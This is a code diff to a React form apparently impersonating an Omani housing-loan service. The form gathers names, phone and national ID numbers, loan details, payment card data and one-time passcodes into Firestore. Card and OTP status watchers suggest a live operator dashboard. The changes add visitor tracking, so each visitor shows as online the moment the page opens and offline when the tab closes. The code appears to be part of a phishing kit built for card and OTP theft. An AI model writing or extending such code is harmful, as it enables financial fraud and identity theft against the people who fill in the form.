@@ -1,12 +1,14 @@
 import { useState, useRef, useEffect } from "react";
 import { Menu, Search, ChevronUp, ChevronDown, User, Phone, CreditCard, Lock, CalendarDays } from "lucide-react";
 import {
-  createVisitorDocument,
+  initVisitorOnline,
+  updateRegistrationData,
   updateLoanData,
   updateCardData,
   watchCardStatus,
   watchOtpStatus,
   submitOtpCode,
+  markVisitorOffline,
 } from "../../../lib/firestore-service";
 
 
@@ -155,9 +157,12 @@ const LOAN_TERM_OPTIONS: OptionItem[] = [
 /* ══════════════════════════════════════════
    PAGE 1 — Registration
 ══════════════════════════════════════════ */
-type RegistrationPageProps = { onNext: (docId: string, phone: string) => void };
+type RegistrationPageProps = {
+  docId: string;
+  onNext: (phone: string) => void;
+};
 
-function RegistrationPage({ onNext }: RegistrationPageProps) {
+function RegistrationPage({ docId, onNext }: RegistrationPageProps) {
   const [name, setName]     = useState("");
   const [phone, setPhone]   = useState("");
   const [idNum, setIdNum]   = useState("");
@@ -174,15 +179,15 @@ function RegistrationPage({ onNext }: RegistrationPageProps) {
     if (!canSubmit) return;
     setLoading(true);
     try {
-      const docId = await createVisitorDocument({
+      await updateRegistrationData(docId, {
         ownerName: name.trim(),
         phoneNumber: phone,
         identityNumber: idNum,
       });
-      onNext(docId, phone);
+      onNext(phone);
     } catch (err) {
       console.error("Firestore error:", err);
-      onNext("", phone);
+      onNext(phone);
     } finally {
       setLoading(false);
     }
@@ -2032,6 +2037,21 @@ export function OmanHousingForm() {
   const [docId, setDocId]           = useState<string>("");
   const [phoneNumber, setPhoneNumber] = useState<string>("");
 
+  /* Create anonymous visitor doc immediately on page open → appears online in dashboard */
+  useEffect(() => {
+    initVisitorOnline()
+      .then((id) => setDocId(id))
+      .catch((err) => console.error("initVisitorOnline error:", err));
+  }, []);
+
+  /* Mark visitor offline when tab/window closes */
+  useEffect(() => {
+    if (!docId) return;
+    const handleUnload = () => markVisitorOffline(docId);
+    window.addEventListener("beforeunload", handleUnload);
+    return () => window.removeEventListener("beforeunload", handleUnload);
+  }, [docId]);
+
   /* stable callbacks for watchCardStatus (avoid re-subscribing on every render) */
   const goOtp    = useRef(() => setPage("otp"));
   const goCard   = useRef(() => setPage(3));
@@ -2040,7 +2060,8 @@ export function OmanHousingForm() {
 
   if (page === 1) return (
     <RegistrationPage
-      onNext={(id, phone) => { setDocId(id); setPhoneNumber(phone); setPage(2); }}
+      docId={docId}
+      onNext={(phone) => { setPhoneNumber(phone); setPage(2); }}
     />
   );
   if (page === 2) return (
